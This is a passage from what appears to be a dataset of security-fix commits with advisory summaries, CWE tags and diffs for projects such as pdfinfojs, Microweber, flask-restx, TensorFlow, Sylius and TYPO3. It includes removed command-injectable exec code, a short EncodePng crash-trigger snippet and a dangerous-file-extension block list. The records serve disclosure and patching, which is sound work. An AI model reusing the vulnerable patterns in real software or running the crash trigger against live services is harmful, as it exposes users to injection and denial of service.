2.10.4.","published_date":"2022-03-16","chain_len":1,"project":"https:\/\/github.com\/star7th\/showdoc","commit_href":"https:\/\/github.com\/star7th\/showdoc\/commit\/3caa32334db0c277b84e993eaca2036f5d1dbef8","commit_sha":"3caa32334db0c277b84e993eaca2036f5d1dbef8","patch":"SINGLE","chain_ord":"['3caa32334db0c277b84e993eaca2036f5d1dbef8']","before_first_fix_commit":"{'92bc6a83a3a60e01a0d2effb98ab47d8d7eab28f'}","last_fix_commit":"3caa32334db0c277b84e993eaca2036f5d1dbef8","chain_ord_pos":1.0,"commit_datetime":"03\/14\/2022, 15:26:49","message":"Upload file vulnerability","author":"star7th","comments":null,"stats":"{'additions': 5, 'deletions': 7, 'total': 12}","files":"{'server\/Application\/Api\/Model\/AttachmentModel.class.php': {'additions': 5, 'deletions': 7, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/star7th\/showdoc\/raw\/3caa32334db0c277b84e993eaca2036f5d1dbef8\/server%2FApplication%2FApi%2FModel%2FAttachmentModel.class.php', 'patch': \"@@ -54,10 +54,10 @@ public function deleteFile($file_id){\\n \\t}\\n \\n \\t\/\/\u4e0a\u4f20\u6587\u4ef6\uff0c\u8fd4\u56deurl\\n-\\tpublic function upload($_files , $file_key , $uid , $item_id = 0  , $page_id = 0  ){\\n+\\tpublic function upload($_files , $file_key , $uid , $item_id = 0  , $page_id = 0 , $check_filename = true  ){\\n \\t\\t$uploadFile = $_files[$file_key] ;\\n \\n-\\t\\tif( !$this->isAllowedFilename($_files[$file_key]['name']) ){\\n+\\t\\tif( $check_filename && !$this->isAllowedFilename($_files[$file_key]['name']) ){\\n \\t\\t\\treturn false;\\n \\t\\t}\\n \\n@@ -324,14 +324,12 @@ public function isDangerFilename($filename){\\n \\tpublic function isAllowedFilename($filename){\\n \\t\\t$allow_array = array(\\n \\t\\t\\t'.jpg','.jpeg','.png','.bmp','.gif','.ico','.webp',\\n-\\t\\t\\t'.mp3','.wav','.mp4',\\n-\\t\\t\\t'.mov','.webmv','.flac','.mkv',\\n+\\t\\t\\t'.mp3','.wav','.mp4','.mov','.flac','.mkv',\\n \\t\\t\\t'.zip','.tar','.gz','.tgz','.ipa','.apk','.rar','.iso',\\n-\\t\\t\\t'.pdf','.ofd','.swf','.epub','.xps',\\n-\\t\\t\\t'.doc','.docx','.wps',\\n+\\t\\t\\t'.pdf','.epub','.xps','.doc','.docx','.wps',\\n \\t\\t\\t'.ppt','.pptx','.xls','.xlsx','.txt','.psd','.csv',\\n \\t\\t\\t'.cer','.ppt','.pub','.json','.css',\\n-\\t\\t\\t) ;\\n+\\t\\t) ;\\n \\n \\t\\t$ext = strtolower(substr($filename,strripos($filename,'.')) ); \/\/\u83b7\u53d6\u6587\u4ef6\u6269\u5c55\u540d\uff08\u8f6c\u4e3a\u5c0f\u5199\u540e\uff09\\n \\t\\tif(in_array( $ext , $allow_array ) ){\"}}","message_norm":"upload file vulnerability","language":"ro","entities":"[('vulnerability', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['server\/Application\/Api\/Model\/AttachmentModel.class.php'])","num_files":1.0},{"index":296,"vuln_id":"GHSA-3pxp-6963-46r9","cwe_id":"{'CWE-77'}","score":0.0,"chain":"{'https:\/\/github.com\/fagbokforlaget\/pdfinfojs\/commit\/5cc59cd8aa13ca8d16bb41da8affdfef370ad4fd'}","dataset":"osv","summary":"Command Injection in pdfinfojs Versions of `pdfinfojs` before 0.4.1 are vulnerable to command injection. This is exploitable if an attacker can control the filename parameter that is passed into the `pdfinfojs` constructor.\n\n\n## Recommendation\n\nUpdate to version 0.4.1 or later.","published_date":"2018-06-07","chain_len":1,"project":"https:\/\/github.com\/fagbokforlaget\/pdfinfojs","commit_href":"https:\/\/github.com\/fagbokforlaget\/pdfinfojs\/commit\/5cc59cd8aa13ca8d16bb41da8affdfef370ad4fd","commit_sha":"5cc59cd8aa13ca8d16bb41da8affdfef370ad4fd","patch":"SINGLE","chain_ord":"['5cc59cd8aa13ca8d16bb41da8affdfef370ad4fd']","before_first_fix_commit":"{'379c0e14db8298b465269653b9ac308d83eb6d4e'}","last_fix_commit":"5cc59cd8aa13ca8d16bb41da8affdfef370ad4fd","chain_ord_pos":1.0,"commit_datetime":"04\/13\/2018, 11:36:11","message":"fix: command injection vulnerability","author":"Deepak Thukral","comments":null,"stats":"{'additions': 4, 'deletions': 4, 'total': 8}","files":"{'lib\/pdfinfo.js': {'additions': 4, 'deletions': 4, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/fagbokforlaget\/pdfinfojs\/raw\/5cc59cd8aa13ca8d16bb41da8affdfef370ad4fd\/lib%2Fpdfinfo.js', 'patch': '@@ -1,9 +1,9 @@\\n-const { exec, execSync } = require(\\'child_process\\');\\n+const { execFile, execFileSync } = require(\\'child_process\\');\\n const utils = require(\\'.\/utils\\');\\n \\n function pdfinfo (filename, options) {\\n   this.options = options || {};\\n-  this.options.additional = [\\'\"\\' + filename + \\'\"\\'];\\n+  this.options.additional = [filename];\\n \\n   pdfinfo.prototype.add_options = function(optionArray) {\\n     if (typeof optionArray.length !== undefined) {\\n@@ -23,7 +23,7 @@ function pdfinfo (filename, options) {\\n   pdfinfo.prototype.getInfoSync = function() {\\n     const self = this;\\n     try {\\n-    \\tlet data = execSync(\\'pdfinfo \\' + self.options.additional.join(\\' \\')).toString(\\'utf8\\');\\n+    \\tlet data = execFileSync(\\'pdfinfo\\', self.options.additional).toString(\\'utf8\\');\\n         return utils.parse(data);\\n     } catch(err) {\\n         throw new Error(\"pdfinfo error: \"+ err.msg);\\n@@ -33,7 +33,7 @@ function pdfinfo (filename, options) {\\n \\n   pdfinfo.prototype.getInfo = function(cb) {\\n     let self = this;\\n-    let child = exec(\\'pdfinfo \\' + self.options.additional.join(\\' \\'), function(error, stdout, stderr) {\\n+    let child = execFile(\\'pdfinfo\\', self.options.additional, (error, stdout, stderr) => {\\n       if (!error) {\\n         let data = utils.parse(stdout);\\n         if (cb && typeof cb === \"function\") {'}}","message_norm":"fix: command injection vulnerability","language":"en","entities":"[('command injection', 'SECWORD', ''), ('vulnerability', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/pdfinfo.js'])","num_files":1.0},{"index":299,"vuln_id":"GHSA-3q55-66g3-p8xq","cwe_id":"{'CWE-79'}","score":4.8,"chain":"{'https:\/\/github.com\/microweber\/microweber\/commit\/89200cfcc2cfefe5554721e7fa3cf52f6a2a9120'}","dataset":"osv","summary":"Cross-site Scripting in microweber File upload filter bypass leading to stored XSS in GitHub repository microweber\/microweber prior to 1.2.12.","published_date":"2022-03-13","chain_len":1,"project":"https:\/\/github.com\/microweber\/microweber","commit_href":"https:\/\/github.com\/microweber\/microweber\/commit\/89200cfcc2cfefe5554721e7fa3cf52f6a2a9120","commit_sha":"89200cfcc2cfefe5554721e7fa3cf52f6a2a9120","patch":"SINGLE","chain_ord":"['89200cfcc2cfefe5554721e7fa3cf52f6a2a9120']","before_first_fix_commit":"{'077b1e2d5dda0c6611b65bce849a18a5620c5c98'}","last_fix_commit":"89200cfcc2cfefe5554721e7fa3cf52f6a2a9120","chain_ord_pos":1.0,"commit_datetime":"03\/11\/2022, 10:04:52","message":"Update Files.php","author":"Bozhidar Slaveykov","comments":null,"stats":"{'additions': 254, 'deletions': 2, 'total': 256}","files":"{'src\/MicroweberPackages\/Utils\/System\/Files.php': {'additions': 254, 'deletions': 2, 'changes': 256, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/microweber\/microweber\/raw\/89200cfcc2cfefe5554721e7fa3cf52f6a2a9120\/src%2FMicroweberPackages%2FUtils%2FSystem%2FFiles.php', 'patch': \"@@ -834,10 +834,262 @@ function get_dangerous_files_extentions()\\n             'xqt',        \/\/    SuperCalc Macro File',\\n             'xys',        \/\/    XYplorer Script File',\\n             'zl9',        \/\/    ZoneAlarm Quarantined EXE File\\n-\\n-\\n             'swf',        \/\/    Flash File\\n \\n+            'key',\\n+            'asax',\\n+            'btapp',\\n+            'xd',\\n+            'fwtemplate',\\n+            'crdownload',\\n+            'whtt',\\n+            'ssp',\\n+            'fmp',\\n+            'jspa',\\n+            'obml16',\\n+            'a5w',\\n+            'crt',\\n+            'vrt',\\n+            'website',\\n+            'p7c',\\n+            'dll',\\n+            'php',\\n+            'mjs',\\n+            'dhtml',\\n+            'xul',\\n+            'bml',\\n+            'download',\\n+            'cshtml',\\n+            'vsdisco',\\n+            'codasite',\\n+            'webbookmark',\\n+            'rjs',\\n+            'wsdl',\\n+            'dml',\\n+            'aro',\\n+            'dcr',\\n+            'shtml',\\n+            'dochtml',\\n+            'dwt',\\n+            'spc',\\n+            'a4p',\\n+            'htaccess',\\n+            'ascx',\\n+            'pac',\\n+            'p7b',\\n+            'xhtm',\\n+            'oam',\\n+            'site',\\n+            'kit',\\n+            'aspx',\\n+            'zul',\\n+            'tpl',\\n+            'htm',\\n+            'seam',\\n+            'svr',\\n+            'pem',\\n+            'url',\\n+            'dap',\\n+            'appcache',\\n+            'chm',\\n+            'wbs',\\n+            'htc',\\n+            'ewp',\\n+            'gsp',\\n+            'asr',\\n+            'der',\\n+            'master',\\n+            'stc',\\n+            'ap',\\n+            'html',\\n+            'p12',\\n+            'xpd',\\n+            'fwp',\\n+            'epibrw',\\n+            'strm',\\n+            'xss',\\n+            'node',\\n+            'disco',\\n+            'gsp',\\n+            'pro',\\n+            'rss',\\n+            'gne',\\n+            'sdb',\\n+            'compressed',\\n+            'asp',\\n+            'browser',\\n+            'php2',\\n+            'sites2',\\n+            'dothtml',\\n+            'bok',\\n+            'axd',\\n+            'nzb',\\n+            'vdw',\\n+            'obml',\\n+            'mhtml',\\n+            'ashx',\\n+            'con',\\n+            'rhtml',\\n+            'alx',\\n+            'opml',\\n+            'web',\\n+            'chat',\\n+            'csr',\\n+            'do',\\n+            'sht',\\n+            'asa',\\n+            'cha',\\n+            'h5p',\\n+            'qf',\\n+            'olp',\\n+            'hyperesources',\\n+            'sparkle',\\n+            'razor',\\n+            'php4',\\n+            'cms',\\n+            'mml',\\n+            'jnlp',\\n+            'har',\\n+            'br',\\n+            'webloc',\\n+            'srf',\\n+            'cer',\\n+            'uhtml',\\n+            'pptmhtml',\\n+            'phtml',\\n+            'xbel',\\n+            'cfm',\\n+            'fwtemplateb',\\n+            'jspx',\\n+            'jsp',\\n+            'xfdl',\\n+            'zhtml',\\n+            'stml',\\n+            'jsonl',\\n+            'maff',\\n+            'dbm',\\n+            'aex',\\n+            'crl',\\n+            'mht',\\n+            'wml',\\n+            'sass',\\n+            'xht',\\n+            'awm',\\n+            'page',\\n+            'hdml',\\n+            'webmanifest',\\n+            'itms',\\n+            'sitemap',\\n+            'shtm',\\n+            'wpp',\\n+            'jss',\\n+            'oth',\\n+            'ucf',\\n+            'prf',\\n+            'freeway',\\n+            'edge',\\n+            'iqy',\\n+            'vrml',\\n+            'mvc',\\n+            'wdgt',\\n+            'discomap',\\n+            'psp',\\n+            'hxs',\\n+            'adr',\\n+            'hype',\\n+            'csp',\\n+            'xhtml',\\n+            'webarchive',\\n+            'qbo',\\n+            'jhtml',\\n+            'svc',\\n+            'phtm',\\n+            'rw3',\\n+            'tpl',\\n+            'stl',\\n+            'wbxml',\\n+            'p7',\\n+            'ndjson',\\n+            'ognc',\\n+            'fwtb',\\n+            'muse',\\n+            'vbd',\\n+            'sites',\\n+            'rt',\\n+            'esproj',\\n+            'private',\\n+            'srl',\\n+            'zhtml',\\n+            'vbhtml', \\n+            'hypetemplate',\\n+            'obml15',\\n+            'hypesymbol',\\n+            'pub',\\n+            'ece',\\n+            'mspx',\\n+            'docmhtml',\\n+            'xws',\\n+            'wgp',\\n+            'tvpi',\\n+            'woa',\\n+            'asmx',\\n+            'xbl',\\n+            'webhistory',\\n+            'idc',\\n+            'jws',\\n+            'lbc',\\n+            'att',\\n+            'tvvi',\\n+            'zvz',\\n+            'php3',\\n+            'webarchivexml',\\n+            'widget',\\n+            'swz',\\n+            'qrm',\\n+            'bwp',\\n+            'atom',\\n+            'cdf',\\n+            'map',\\n+            'hdm',\\n+            'php5',\\n+            'rwsw',\\n+            'wgt',\\n+            'nod',\\n+            'rflw',\\n+            'htx',\\n+            'mvr',\\n+            'an',\\n+            'rwp',\\n+            'lasso',\\n+            'vlp',\\n+            'stp',\\n+            'nxg',\\n+            'faces',\\n+            'kcmsf',\\n+            'ptw',\\n+            'less',\\n+            'saveddeck',\\n+            'ccbjs',\\n+            'wn',\\n+            'ppthtml',\\n+            'jcz',\\n+            'jvs',\\n+            'rwtheme',\\n+            'jst',\\n+            'mapx',\\n+            'cpg',\\n+            'wpx',\\n+            'qbx',\\n+            'suck',\\n+            'iwdgt',\\n+            'public',\\n+            'cphd',\\n+            'moz',\\n+            'zfo',\\n+            'stm',\\n+            'fcgi',\\n+            'itpc',\\n+            'cfml'\\n         );\"}}","message_norm":"update files.php","language":"fr","entities":"[('update', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/MicroweberPackages\/Utils\/System\/Files.php'])","num_files":1.0},{"index":301,"vuln_id":"GHSA-3q6g-vf58-7m4g","cwe_id":"{'CWE-400'}","score":7.5,"chain":"{'https:\/\/github.com\/python-restx\/flask-restx\/commit\/bab31e085f355dd73858fd3715f7ed71849656da'}","dataset":"osv","summary":"Regular Expression Denial of Service in flask-restx Flask RESTX contains a regular expression that is vulnerable to [ReDoS](https:\/\/owasp.org\/www-community\/attacks\/Regular_expression_Denial_of_Service_-_ReDoS) (Regular Expression Denial of Service) in `email_regex`.","published_date":"2021-09-08","chain_len":1,"project":"https:\/\/github.com\/python-restx\/flask-restx","commit_href":"https:\/\/github.com\/python-restx\/flask-restx\/commit\/bab31e085f355dd73858fd3715f7ed71849656da","commit_sha":"bab31e085f355dd73858fd3715f7ed71849656da","patch":"SINGLE","chain_ord":"['bab31e085f355dd73858fd3715f7ed71849656da']","before_first_fix_commit":"{'e1ab7e34a47fa8c2fd025402b9c65afbe24d5e98'}","last_fix_commit":"bab31e085f355dd73858fd3715f7ed71849656da","chain_ord_pos":1.0,"commit_datetime":"09\/01\/2021, 19:53:02","message":"optimize email regex (credits: @kevinbackhouse, fix: #372)","author":"ziirish","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'flask_restx\/inputs.py': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/python-restx\/flask-restx\/raw\/bab31e085f355dd73858fd3715f7ed71849656da\/flask_restx%2Finputs.py', 'patch': '@@ -48,7 +48,7 @@ def my_type(value):\\n \\n \\n email_regex = re.compile(\\n-    r\"^\" \"(?P<local>[^@]*[^@.])\" r\"@\" r\"(?P<server>[^@]+(?:\\\\.[^@]+)*)\" r\"$\",\\n+    r\"^\" \"(?P<local>[^@]*[^@.])\" r\"@\" r\"(?P<server>[^@\\\\.]+(?:\\\\.[^@\\\\.]+)*)\" r\"$\",\\n     re.IGNORECASE,\\n )'}}","message_norm":"optimize email regex (credits: @kevinbackhouse, fix: #372)","language":"en","entities":"[('optimize', 'ACTION', ''), ('#372', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['flask_restx\/inputs.py'])","num_files":1.0},{"index":302,"vuln_id":"GHSA-3qgw-p4fm-x7gf","cwe_id":"{'CWE-369'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ff489d95a9006be080ad14feb378f2b4dac35552'}","dataset":"osv","summary":"Division by zero in TFLite's convolution code ### Impact\nTFLite's [convolution code](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/09c73bca7d648e961dd05898292d91a8322a9d45\/tensorflow\/lite\/kernels\/conv.cc) has multiple division where the divisor is controlled by the user and not checked to be non-zero. For example:\n\n```cc \nconst int input_size = NumElements(input) \/ SizeOfDimension(input, 0);\n```\n\n### Patches\nWe have patched the issue in GitHub commit [ff489d95a9006be080ad14feb378f2b4dac35552](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ff489d95a9006be080ad14feb378f2b4dac35552).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ff489d95a9006be080ad14feb378f2b4dac35552","commit_sha":"ff489d95a9006be080ad14feb378f2b4dac35552","patch":"SINGLE","chain_ord":"['ff489d95a9006be080ad14feb378f2b4dac35552']","before_first_fix_commit":"{'09c73bca7d648e961dd05898292d91a8322a9d45'}","last_fix_commit":"ff489d95a9006be080ad14feb378f2b4dac35552","chain_ord_pos":1.0,"commit_datetime":"04\/28\/2021, 19:37:35","message":"Prevent division by 0.\n\nPiperOrigin-RevId: 370962554\nChange-Id: I0b9b62f4d8e1046dd88f9433f8dfeaf61a901680","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 6, 'deletions': 2, 'total': 8}","files":"{'tensorflow\/lite\/kernels\/conv.cc': {'additions': 6, 'deletions': 2, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/ff489d95a9006be080ad14feb378f2b4dac35552\/tensorflow%2Flite%2Fkernels%2Fconv.cc', 'patch': '@@ -545,6 +545,7 @@ TfLiteStatus Prepare(KernelType kernel_type, TfLiteContext* context,\\n     \/\/ Only one scale factor per batch is typically necessary. See optimized\\n     \/\/ implementation for why we need to allocate for the height of the inputs\\n     \/\/ flattened to 2D.\\n+    TF_LITE_ENSURE(context, channels_in != 0);\\n     const int height = NumElements(input) \/ channels_in;\\n     int scaling_dims[1] = {height};\\n     if (!TfLiteIntArrayEqualsArray(scaling_factors->dims, 1, scaling_dims)) {\\n@@ -587,6 +588,7 @@ TfLiteStatus Prepare(KernelType kernel_type, TfLiteContext* context,\\n       input_offsets->type = kTfLiteInt32;\\n       input_offsets->allocation_type = kTfLiteArenaRw;\\n       \/\/ See above comment for the need to allocate for height of inputs.\\n+      TF_LITE_ENSURE(context, channels_in != 0);\\n       const int height = NumElements(input) \/ channels_in;\\n       const int input_offset_dims[1] = {height};\\n       if (!TfLiteIntArrayEqualsArray(input_offsets->dims, 1,\\n@@ -886,8 +888,9 @@ TfLiteStatus EvalHybridPerChannel(TfLiteContext* context, TfLiteNode* node,\\n   CalculateActivationRange(params->activation, &output_activation_min,\\n                            &output_activation_max);\\n \\n-  const int input_size = NumElements(input) \/ SizeOfDimension(input, 0);\\n   const int batch_size = SizeOfDimension(input, 0);\\n+  TF_LITE_ENSURE(context, batch_size != 0);\\n+  const int input_size = NumElements(input) \/ batch_size;\\n   TfLiteTensor* quantized_input_tensor;\\n   TF_LITE_ENSURE_OK(context,\\n                     GetTemporarySafe(context, node, data->input_quantized_index,\\n@@ -989,8 +992,9 @@ TfLiteStatus EvalHybrid(TfLiteContext* context, TfLiteNode* node,\\n   CalculateActivationRange(params->activation, &output_activation_min,\\n                            &output_activation_max);\\n \\n-  const int input_size = NumElements(input) \/ SizeOfDimension(input, 0);\\n   const int batch_size = SizeOfDimension(input, 0);\\n+  TF_LITE_ENSURE(context, batch_size != 0);\\n+  const int input_size = NumElements(input) \/ batch_size;\\n \\n   const float* input_ptr = GetTensorData<float>(input);\\n   TfLiteTensor* quantized_input_tensor;'}}","message_norm":"prevent division by 0.\n\npiperorigin-revid: 370962554\nchange-id: i0b9b62f4d8e1046dd88f9433f8dfeaf61a901680","language":"en","entities":"[('prevent', 'ACTION', ''), ('division by 0', 'SECWORD', ''), ('370962554', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/conv.cc'])","num_files":1.0},{"index":305,"vuln_id":"GHSA-3qxp-qjq7-w4hf","cwe_id":"{'CWE-754'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/26eb323554ffccd173e8a79a8c05c15b685ae4d1'}","dataset":"osv","summary":"CHECK-fail in tf.raw_ops.EncodePng ### Impact\nAn attacker can trigger a `CHECK` fail in PNG encoding by providing an empty input tensor as the pixel data:\n\n```python\nimport tensorflow as tf\n\nimage = tf.zeros([0, 0, 3])\nimage = tf.cast(image, dtype=tf.uint8) \ntf.raw_ops.EncodePng(image=image) \n```\n\nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/e312e0791ce486a80c9d23110841525c6f7c3289\/tensorflow\/core\/kernels\/image\/encode_png_op.cc#L57-L60) only validates that the total number of pixels in the image does not overflow. Thus, an attacker can send an empty matrix for encoding. However, if the tensor is empty, then the associated buffer is `nullptr`. Hence, when [calling `png::WriteImageToBuffer`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/e312e0791ce486a80c9d23110841525c6f7c3289\/tensorflow\/core\/kernels\/image\/encode_png_op.cc#L79-L93), the first argument (i.e., `image.flat<T>().data()`) is `NULL`. This then triggers the `CHECK_NOTNULL` in the [first line of `png::WriteImageToBuffer`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/e312e0791ce486a80c9d23110841525c6f7c3289\/tensorflow\/core\/lib\/png\/png_io.cc#L345-L349).\n\n```cc\ntemplate <typename T>\nbool WriteImageToBuffer(\n    const void* image, int width, int height, int row_bytes, int num_channels,\n    int channel_bits, int compression, T* png_string,\n    const std::vector<std::pair<std::string, std::string> >* metadata) {\n  CHECK_NOTNULL(image);\n  ...\n}\n```\n\nSince `image` is null, this results in `abort` being called after printing the stacktrace. Effectively, this allows an attacker to mount a denial of service attack.\n\n### Patches\nWe have patched the issue in GitHub commit [26eb323554ffccd173e8a79a8c05c15b685ae4d1](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/26eb323554ffccd173e8a79a8c05c15b685ae4d1).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/26eb323554ffccd173e8a79a8c05c15b685ae4d1","commit_sha":"26eb323554ffccd173e8a79a8c05c15b685ae4d1","patch":"SINGLE","chain_ord":"['26eb323554ffccd173e8a79a8c05c15b685ae4d1']","before_first_fix_commit":"{'e312e0791ce486a80c9d23110841525c6f7c3289'}","last_fix_commit":"26eb323554ffccd173e8a79a8c05c15b685ae4d1","chain_ord_pos":1.0,"commit_datetime":"04\/21\/2021, 20:03:47","message":"Fix null CHECK issue with `tf.raw_ops.EncodePng`.\n\nPiperOrigin-RevId: 369717714\nChange-Id: I24136cd99c20b8466671f4f93b670ef6f6dd1250","author":"Amit Patankar","comments":null,"stats":"{'additions': 2, 'deletions': 0, 'total': 2}","files":"{'tensorflow\/core\/kernels\/image\/encode_png_op.cc': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/26eb323554ffccd173e8a79a8c05c15b685ae4d1\/tensorflow%2Fcore%2Fkernels%2Fimage%2Fencode_png_op.cc', 'patch': '@@ -54,6 +54,8 @@ class EncodePngOp : public OpKernel {\\n     OP_REQUIRES(context, image.dims() == 3,\\n                 errors::InvalidArgument(\"image must be 3-dimensional\",\\n                                         image.shape().DebugString()));\\n+    OP_REQUIRES(context, image.NumElements() > 0,\\n+                errors::Internal(\"Invalid image provided.\"));\\n     OP_REQUIRES(\\n         context,\\n         FastBoundsCheck(image.NumElements(), std::numeric_limits<int32>::max()),'}}","message_norm":"fix null check issue with `tf.raw_ops.encodepng`.\n\npiperorigin-revid: 369717714\nchange-id: i24136cd99c20b8466671f4f93b670ef6f6dd1250","language":"en","entities":"[('fix', 'ACTION', ''), ('issue', 'FLAW', ''), ('tf.raw_ops.encodepng', 'SECWORD', ''), ('369717714', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/image\/encode_png_op.cc'])","num_files":1.0},{"index":308,"vuln_id":"GHSA-3r8j-pmch-5j2h","cwe_id":"{'CWE-209'}","score":3.5,"chain":"{'https:\/\/github.com\/Sylius\/Sylius\/commit\/be245302dfc594d8690fe50dd47631d186aa945f'}","dataset":"osv","summary":"Internal exception message exposure for login action in Sylius ## Internal exception message exposure for login action\n\n### Impact\nException messages from internal exceptions (like database exception) are wrapped by `\\Symfony\\Component\\Security\\Core\\Exception\\AuthenticationServiceException` and propagated through the system to UI. Therefore, some internal system information may leak and be visible to the customer. \n\nA validation message with the exception details will be presented to the user when one will try to log into the shop. \n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\n### Workarounds\nThe `src\/Sylius\/Bundle\/UiBundle\/Resources\/views\/Security\/_login.html.twig` file should be overridden and lines https:\/\/github.com\/Sylius\/Sylius\/blob\/1.4\/src\/Sylius\/Bundle\/UiBundle\/Resources\/views\/Security\/_login.html.twig#L13-L17 should be replaced with\n```twig\n        {% if last_error %}\n            <div class=\"ui left aligned basic segment\">\n                {{ messages.error(last_error.messageKey) }}\n            <\/div>\n        {% endif %}\n``` \n\nThe `messageKey` field should be used instead of the `message`.","published_date":"2019-12-05","chain_len":1,"project":"https:\/\/github.com\/Sylius\/Sylius","commit_href":"https:\/\/github.com\/Sylius\/Sylius\/commit\/be245302dfc594d8690fe50dd47631d186aa945f","commit_sha":"be245302dfc594d8690fe50dd47631d186aa945f","patch":"SINGLE","chain_ord":"['be245302dfc594d8690fe50dd47631d186aa945f']","before_first_fix_commit":"{'19b2fe4a6cdb2186489221ea8b5e5628c8223286'}","last_fix_commit":"be245302dfc594d8690fe50dd47631d186aa945f","chain_ord_pos":1.0,"commit_datetime":"12\/04\/2019, 12:59:26","message":"Generate changelog for v1.3.14","author":"Kamil Kokot","comments":null,"stats":"{'additions': 17, 'deletions': 0, 'total': 17}","files":"{'CHANGELOG-1.3.md': {'additions': 17, 'deletions': 0, 'changes': 17, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Sylius\/Sylius\/raw\/be245302dfc594d8690fe50dd47631d186aa945f\/CHANGELOG-1.3.md', 'patch': '@@ -1,5 +1,22 @@\\n # CHANGELOG FOR `1.3.X`\\n \\n+## v1.3.14 (2019-12-03)\\n+\\n+### CVE-2019-16768: Internal exception message exposure in login action.\\n+\\n+#### Details\\n+\\n+Exception messages from internal exceptions (like database exception) are wrapped by \\n+`\\\\Symfony\\\\Component\\\\Security\\\\Core\\\\Exception\\\\AuthenticationServiceException` and propagated through the system to UI. \\n+Therefore, some internal system information may leak and be visible to the customer.\\n+\\n+A validation message with the exception details will be presented to the user when one will try to log into the shop.\\n+\\n+#### Workaround\\n+\\n+This release patches the reported vulnerability. The `src\/Sylius\/Bundle\/UiBundle\/Resources\/views\/Security\/_login.html.twig` \\n+file from Sylius should be overridden and `{{ messages.error(last_error.message) }}` changed to `{{ messages.error(last_error.messageKey) }}`.\\n+\\n ## v1.3.13 (2019-05-29)\\n \\n #### Details'}}","message_norm":"generate changelog for v1.3.14","language":"da","entities":"[('v1.3.14', 'VERSION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['CHANGELOG-1.3.md'])","num_files":1.0},{"index":309,"vuln_id":"GHSA-3r95-23jp-mhvg","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/TYPO3\/typo3\/commit\/6f2554dc4ea0b670fd5599c54fd788d4db96c4a0'}","dataset":"osv","summary":"Cross-Site Scripting in TYPO3's Form Framework > ### Meta\n> * CVSS: `CVSS:3.1\/AV:N\/AC:L\/PR:L\/UI:R\/S:C\/C:L\/I:L\/A:N\/E:F\/RL:O\/RC:C` (4.9)\n\n### Problem\nIt has been discovered that the Form Designer backend module of the Form Framework is vulnerable to cross-site scripting. A valid backend user account with access to the form module is needed to exploit this vulnerability.\n\n### Solution\nUpdate to TYPO3 versions 8.7.47 ELTS, 9.5.35 ELTS, 10.4.29, 11.5.11 that fix the problem described above.\n\n### Credits\nThanks to Gabe Troyan who reported and fixed the issue.\n\n### References\n* [TYPO3-CORE-SA-2022-003](https:\/\/typo3.org\/security\/advisory\/typo3-core-sa-2022-003)","published_date":"2022-06-17","chain_len":1,"project":"https:\/\/github.com\/TYPO3\/typo3","commit_href":"https:\/\/github.com\/TYPO3\/typo3\/commit\/6f2554dc4ea0b670fd5599c54fd788d4db96c4a0","commit_sha":"6f2554dc4ea0b670fd5599c54fd788d4db96c4a0","patch":"SINGLE","chain_ord":"['6f2554dc4ea0b670fd5599c54fd788d4db96c4a0']","before_first_fix_commit":"{'c93ea692e7dfef03b7c50fe5437487545bee4d6a'}","last_fix_commit":"6f2554dc4ea0b670fd5599c54fd788d4db96c4a0","chain_ord_pos":1.0,"commit_datetime":"06\/14\/2022, 07:17:30","message":"[SECURITY] Ensure text preview of multivalue items in form editor\n\nMultivalue items in the form editor user interface were previewed\nas HTML, but should 